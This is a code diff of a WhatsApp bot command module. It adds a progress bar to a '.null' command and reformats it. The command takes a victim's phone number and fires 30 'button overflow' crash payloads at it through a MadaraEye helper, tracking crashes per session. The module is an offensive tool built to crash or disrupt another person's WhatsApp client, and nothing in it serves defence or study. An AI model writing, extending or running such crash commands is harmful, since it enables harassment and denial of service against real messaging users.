@@ -15,29 +15,36 @@ module.exports = {
         const s = ctx.settings;
         const prefix = s.prefix || '.';
         const phone = sock._sessionPhone || sock.user?.id?.split(':')[0] || 'default';
-        
+
         if (!args[0]) {
             return sock.sendMessage(ctx.from, { text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}null <number>` }, { quoted: msg });
         }
-        
+
         const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-        
-        try { await canCrash(phone); } catch (e) { return sock.sendMessage(ctx.from, { text: `❌ ${e.message}` }, { quoted: msg }); }
-        
-        let eye = global.getMadaraEye?.(sock);
-        if (!eye) eye = new MadaraEye(sock);
-        
+
+        try { await canCrash(phone); } catch (e) {
+            return sock.sendMessage(ctx.from, { text: `❌ ${e.message}` }, { quoted: msg });
+        }
+
+        let eye = global.getMadaraEye?.(sock) || new MadaraEye(sock);
+
         const TOTAL = 30;
         const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
-        
+        await bar.init('ʙᴜᴛᴛᴏɴ ᴏᴠᴇʀғʟᴏᴡ...');
+
         try {
             for (let i = 0; i < TOTAL; i++) {
-                try { await canCrash(phone); } catch (e) { await bar.done(`🛡️ ${e.message}\n✅ ᴘᴀʀᴛɪᴀʟ: ${i} ᴘᴀʏʟᴏᴀᴅs`); return; }
+                try { await canCrash(phone); } catch (e) {
+                    await bar.done(`🛡️ ${e.message}\n✅ ᴘᴀʀᴛɪᴀʟ: ${i} ᴘᴀʏʟᴏᴀᴅs`);
+                    return;
+                }
                 await eye.buttonOverflow(target);
                 await recordCrash(phone);
                 await bar.update(1, 'ʙᴜᴛᴛᴏɴ ᴏᴠᴇʀғʟᴏᴡ');
             }
             await bar.done(`✅ ʙᴜᴛᴛᴏɴ ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n📊 ${TOTAL} ᴘᴀʏʟᴏᴀᴅs`);
-        } catch (e) { await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`); }
+        } catch (e) {
+            await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`);
+        }
     }
 };
